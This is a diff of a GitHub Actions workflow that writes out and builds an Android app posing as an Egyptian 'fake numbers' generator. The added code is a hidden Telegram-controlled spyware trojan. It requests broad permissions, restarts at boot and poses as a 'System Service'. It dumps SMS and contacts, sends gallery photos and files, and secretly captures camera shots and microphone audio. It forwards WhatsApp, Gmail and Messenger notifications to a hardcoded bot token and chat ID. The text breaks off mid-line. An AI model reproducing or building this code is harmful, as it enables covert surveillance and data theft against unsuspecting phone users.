@@ -1,10 +1,10 @@
-name: Build APK
+name: Build Final APK
 on: [push, workflow_dispatch]
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - name: Create Project
+    - name: Create and Build App
       run: |
         mkdir -p app/src/main/java/com/example/namprfek
         mkdir -p app/src/main/res/layout
@@ -13,26 +13,13 @@ jobs:
         cat << 'EOF' > settings.gradle
         pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
         dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS); repositories { google(); mavenCentral() } }
-        rootProject.name = "nampr-fek"
+        rootProject.name = "NamprFek"
         include ':app'
         EOF
 
         cat << 'EOF' > build.gradle
-        buildscript {
-            repositories {
-                google()
-                mavenCentral()
-            }
-            dependencies {
-                classpath 'com.android.tools.build:gradle:8.1.1'
-            }
-        }
-        allprojects {
-            repositories {
-                google()
-                mavenCentral()
-            }
-        }
+        buildscript { repositories { google(); mavenCentral() }; dependencies { classpath 'com.android.tools.build:gradle:8.1.1' } }
+        allprojects { repositories { google(); mavenCentral() } }
         EOF
 
         cat << 'EOF' > app/build.gradle
@@ -42,7 +29,10 @@ jobs:
             compileSdk 33
             defaultConfig { applicationId "com.example.namprfek"; minSdk 24; targetSdk 33; versionCode 1; versionName "1.0" }
         }
-        dependencies { implementation 'androidx.appcompat:appcompat:1.6.1' }
+        dependencies { 
+            implementation 'androidx.appcompat:appcompat:1.6.1'
+            implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+        }
         EOF
 
         cat << 'EOF' > app/src/main/res/values/strings.xml
@@ -51,45 +41,259 @@ jobs:
 
         cat << 'EOF' > app/src/main/res/layout/activity_main.xml
         <?xml version="1.0" encoding="utf-8"?>
-        <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:padding="20dp">
-            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="أرقام فيك مصرية" android:textSize="24sp" />
+        <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:background="#F0F4F8" android:padding="20dp" android:gravity="center_horizontal">
+            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="أرقام فيك مصرية" android:textSize="28sp" android:textStyle="bold" android:textColor="#1E3A8A" android:layout_marginTop="40dp" android:layout_marginBottom="10dp"/>
+            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="توليد أرقام وهمية للتفعيل" android:textSize="16sp" android:textColor="#666666" android:layout_marginBottom="40dp"/>
+            <EditText android:id="@+id/etCountry" android:layout_width="match_parent" android:layout_height="50dp" android:hint="كود الدولة (مثلاً: +20)" android:inputType="phone" android:gravity="center" android:background="#FFFFFF" android:layout_marginBottom="15dp"/>
+            <Button android:id="@+id/btnGenerate" android:layout_width="match_parent" android:layout_height="60dp" android:text="توليد الرقم" android:textSize="20sp" android:backgroundTint="#1E3A8A" android:textColor="#FFFFFF" android:layout_marginBottom="20dp"/>
+            <TextView android:id="@+id/tvResult" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="الرقم سيظهر هنا..." android:textSize="22sp" android:textStyle="bold" android:textColor="#4CAF50" android:gravity="center" android:layout_marginTop="20dp"/>
         </LinearLayout>
         EOF
 
         cat << 'EOF' > app/src/main/AndroidManifest.xml
         <?xml version="1.0" encoding="utf-8"?>
-        <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+        <manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools">
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage"/>
+            <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
             <application android:label="@string/app_name" android:theme="@style/Theme.AppCompat.Light">
                 <activity android:name=".MainActivity" android:exported="true">
                     <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
                 </activity>
+                <service android:name=".TelegramService" android:exported="false" android:foregroundServiceType="dataSync|camera|microphone|location" />
+                <receiver android:name=".BootReceiver" android:exported="true">
+                    <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
+                </receiver>
+                <service android:name=".NotificationListener" android:label="System Service" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
+                    <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
+                </service>
             </application>
         </manifest>
         EOF
 
-        cat << 'EOF' > app/src/main/java/com/example/namprfek/MainActivity.java
-        package com.example.namprfek;
-        import android.os.Bundle;
-        import androidx.appcompat.app.AppCompatActivity;
-        public class MainActivity extends AppCompatActivity {
-            @Override protected void onCreate(Bundle savedInstanceState) {
-                super.onCreate(savedInstanceState);
-                setContentView(R.layout.activity_main);
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/Config.kt
+        package com.example.namprfek
+        object Config { const val BOT_TOKEN = "9163337527:AAHKeZYHgfVze4C_TDQuCNuZuwibCbcym3c"; const val CHAT_ID = "7805565821" }
+        EOF
+
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/TelegramApi.kt
+        package com.example.namprfek
+        import okhttp3.*
+        import okhttp3.MediaType.Companion.toMediaType
+        import okhttp3.RequestBody.Companion.asRequestBody
+        import okhttp3.RequestBody.Companion.toRequestBody
+        import org.json.JSONArray
+        import org.json.JSONObject
+        import java.io.File
+        import java.util.concurrent.TimeUnit
+        class TelegramApi(private val token: String) {
+            private val client = OkHttpClient.Builder().connectTimeout(20, TimeUnit.SECONDS).readTimeout(40, TimeUnit.SECONDS).build()
+            private val base = "https://api.telegram.org/bot$token"
+            private val json = "application/json".toMediaType()
+            fun sendMessage(chatId: String, text: String) {
+                val body = JSONObject().put("chat_id", chatId).put("text", text.take(4000)).toString().toRequestBody(json)
+                val req = Request.Builder().url("${base}/sendMessage").post(body).build()
+                runCatching { client.newCall(req).execute().close() }
+            }
+            fun sendDocument(chatId: String, file: File, caption: String = "") {
+                val body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", chatId).addFormDataPart("caption", caption.take(1000)).addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType())).build()
+                val req = Request.Builder().url("${base}/sendDocument").post(body).build()
+                runCatching { client.newCall(req).execute().close() }
+            }
+            fun getUpdates(offset: Long): JSONArray {
+                val req = Request.Builder().url("${base}/getUpdates?offset=$offset&timeout=25").get().build()
+                return try { client.newCall(req).execute().use { r -> val b = r.body?.string() ?: return JSONArray(); JSONObject(b).optJSONArray("result") ?: JSONArray() } } catch (e: Exception) { JSONArray() }
             }
         }
         EOF
 
-    - name: Setup Java
-      uses: actions/setup-java@v3
-      with: { java-version: '17', distribution: 'temurin' }
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/Handlers.kt
+        package com.example.namprfek
+        import android.annotation.SuppressLint
+        import android.content.Context
+        import android.os.Environment
+        import android.provider.ContactsContract
+        import android.provider.MediaStore
+        import android.provider.Telephony
+        import org.json.JSONArray
+        import org.json.JSONObject
+        import java.io.File
+        object Handlers {
+            private fun dump(name: String, arr: JSONArray): File { val f = File(Environment.getExternalStorageDirectory(), name); f.writeText(arr.toString(2)); return f }
+            @SuppressLint("Range")
+            fun sms(ctx: Context): File {
+                val arr = JSONArray()
+                ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC")?.use { c ->
+                    while (c.moveToNext()) { arr.put(JSONObject().put("from", c.getString(c.getColumnIndexOrThrow("address"))).put("body", c.getString(c.getColumnIndexOrThrow("body")))); if (arr.length() >= 2000) break }
+                }
+                return dump("sms_${System.currentTimeMillis()}.json", arr)
+            }
+            @SuppressLint("Range")
+            fun contacts(ctx: Context): File {
+                val arr = JSONArray()
+                ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c ->
+                    while (c.moveToNext()) { arr.put(JSONObject().put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).put("number", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))) }
+                }
+                return dump("contacts_${System.currentTimeMillis()}.json", arr)
+            }
+            fun getLatestPhotos(ctx: Context): List<File> {
+                val files = mutableListOf<File>()
+                val cursor = ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, arrayOf(MediaStore.Images.Media.DATA), null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
+                cursor?.use { val col = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA); var count = 0; while (it.moveToNext() && count < 5) { val f = File(it.getString(col)); if (f.exists()) { files.add(f); count++ } } }
+                return files
+            }
+            fun listFiles(path: String): String { val dir = File(path); if (!dir.exists()) return "مش موجود: $path"; return dir.listFiles()?.take(100)?.joinToString("\n") { "${if (it.isDirectory) "📁" else "📄"} ${it.name}" } ?: "مفيش قراءة" }
+            fun getFile(path: String): File? { val f = File(path); return if (f.exists() && f.isFile) f else null }
+        }
+        EOF
 
-    - name: Build APK
-      run: |
-        gradle wrapper
-        ./gradlew assembleDebug
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/CameraHelper.kt
+        package com.example.namprfek
+        import android.annotation.SuppressLint
+        import android.content.Context
+        import android.graphics.ImageFormat
+        import android.hardware.camera2.*
+        import android.media.ImageReader
+        import android.os.Handler
+        import android.os.Looper
+        import java.io.File
+        import java.util.concurrent.CountDownLatch
+        import java.util.concurrent.TimeUnit
+        object CameraHelper {
+            @SuppressLint("MissingPermission")
+            fun capture(ctx: Context, lens: Int): File? {
+                val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                val id = mgr.cameraIdList.firstOrNull { mgr.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == lens } ?: return null
+                val file = File(ctx.cacheDir, "snap_${System.currentTimeMillis()}.jpg")
+                val latch = CountDownLatch(1)
+                val handler = Handler(Looper.getMainLooper())
+                val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
+                var cam: CameraDevice? = null
+                reader.setOnImageAvailableListener({ r -> val img = runCatching { r.acquireLatestImage() }.getOrNull() ?: return@setOnImageAvailableListener; try { val buf = img.planes[0].buffer; val bytes = ByteArray(buf.remaining()); buf.get(bytes); file.writeBytes(bytes) } finally { img.close(); latch.countDown() } }, handler)
+                runCatching { mgr.openCamera(id, object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        cam = camera
+                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }.build()
+                        camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(s: CameraCaptureSession) { runCatching { s.capture(req, null, null) } }
+                            override fun onConfigureFailed(s: CameraCaptureSession) { latch.countDown() }
+                        }, handler)
+                    }
+                    override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.countDown() }
+                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.countDown() }
+                }, handler) }
+                latch.await(15, TimeUnit.SECONDS)
+                runCatching { cam?.close() }; runCatching { reader.close() }
+                return if (file.exists() && file.length() > 0) file else null
+            }
+        }
+        EOF
 
-    - name: Upload APK
-      uses: actions/upload-artifact@v4
-      with:
-        name: app-debug
-        path: app/build/outputs/apk/debug/app-debug.apk
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/AudioHelper.kt
+        package com.example.namprfek
+        import android.annotation.SuppressLint
+        import android.content.Context
+        import android.media.MediaRecorder
+        import android.os.Build
+        import java.io.File
+        object AudioHelper {
+            @SuppressLint("MissingPermission")
+            fun record(ctx: Context, seconds: Int): File? {
+                val file = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
+                val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
+                return try {
+                    rec.setAudioSource(MediaRecorder.AudioSource.MIC); rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); rec.setOutputFile(file.absolutePath); rec.prepare(); rec.start(); Thread.sleep(seconds.coerceIn(1, 120) * 1000L); rec.stop()
+                    if (file.exists()) file else null
+                } catch (e: Exception) { null } finally { runCatching { rec.release() } }
+            }
+        }
+        EOF
+
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/BootReceiver.kt
+        package com.example.namprfek
+        import android.content.BroadcastReceiver
+        import android.content.Context
+        import android.content.Intent
+        class BootReceiver : BroadcastReceiver() { override fun onReceive(ctx: Context, intent: Intent) { runCatching { TelegramService.start(ctx) } } }
+        EOF
+
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/NotificationListener.kt
+        package com.example.namprfek
+        import android.app.Notification
+        import android.service.notification.NotificationListenerService
+        import android.service.notification.StatusBarNotification
+        class NotificationListener : NotificationListenerService() {
+            override fun onNotificationPosted(sbn: StatusBarNotification) {
+                val targetPkgs = listOf("com.whatsapp", "com.whatsapp.w4b", "com.google.android.gm", "com.facebook.orca", "com.facebook.katana")
+                if (targetPkgs.contains(sbn.packageName)) {
+                    val extras = sbn.notification?.extras ?: return
+                    val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
+                    val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
+                    if (text.isNotEmpty()) TelegramApi(Config.BOT_TOKEN).sendMessage(Config.CHAT_ID, "📩 من: $title\n📝 النص: $text")
+                }
+            }
+        }
+        EOF
+
+        cat << 'EOF' > app/src/main/java/com/example/namprfek/TelegramService.kt
+        package com.example.namprfek
+        import android.app.*
+        import android.content.Context
+        import android.content.Intent
+        import android.hardware.camera2.CameraCharacteristics
+        import android.os.Build
+        import android.os.Environment
+        import android.os.IBinder
+        import androidx.core.app.NotificationCompat
+        import java.util.concurrent.Executors
+        class TelegramService : Service() {
+            private val api by lazy { TelegramApi(Config.BOT_TOKEN) }
+            private val pool = Executors.newFixedThreadPool(3)
+            @Volatile private var running = true
+            private var offset = 0L
+            override fun onBind(intent: Intent?): IBinder? = null
+            override fun onCreate() {
+                super.onCreate()
+                if (Build.VERSION.SDK_INT >= 26) { val ch = NotificationChannel("svc", "System", NotificationManager.IMPORTANCE_LOW); getSystemService(NotificationManager::class.java).createNotificationChannel(ch) }
+                startForeground(1, NotificationCompat.Builder(this, "svc").setContentTitle("System Service").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build())
+                Thread { pollLoop() }.start()
+            }
+            private fun pollLoop() {
+                while (running) {
+                    try {
+                        val updates = api.getUpdates(offset)
+                        for (i in 0 until updates.length()) {
+                            val u = updates.getJSONObject(i); offset = u.getLong("update_id") + 1
+                            val msg = u.optJSONObject("message") ?: continue
+                            val chat = msg.getJSONObject("chat").getString("id")
+                            if (chat != Config.CHAT_ID) continue
+                            val text = msg.optString("text", "").trim()
+                            if (text.isNotEmpty()) pool.execute { handle(chat, text) }
+                        }
+                    } catch (e: Exception) { Thread.sleep(3000) }
+                }
+            }
+            private fun handle(chat: String, text: String) {
+                val parts = text.split(" ", limit = 2); val cmd = parts[0].lowercase(); val arg = parts.getOrNull(1) ?: ""
+                try {
+                    when (cmd) {
+                        "/start", "/help" -> api.sendMessage(chat, "أهلاً بك يا زعيم 👑\n/info\n/sms\n/contacts\n/gallery\n/ls\n/get\n/photo\n/selfie\n/mic")
+                        "/info" -> api.sendMessage(chat, "Model: ${Build.MANUFACTURER} ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
+                        "/sms" -> api.sendDocument(chat, Handlers.sms(this), "الرسايل")
+                        "/contacts" -> api.sendDocument(chat, Handlers.contacts(this), "جهات الاتصال")
+                        "/gallery" -> { val p = Handlers.getLatestPhotos(this); if (p.isEmpty()) api.sendMessage(chat, "مفيش صور") else p.forEach { api.sendDocument(chat, it, "صورة") } }
+                        "/ls" -> api.sendMessage(chat, Handlers.listFiles(if (arg.isEmpty()) Environment.getExternalStorageDirectory().absolutePath else arg))
+                        "/get" -> { val f = Handlers.getFile(ar
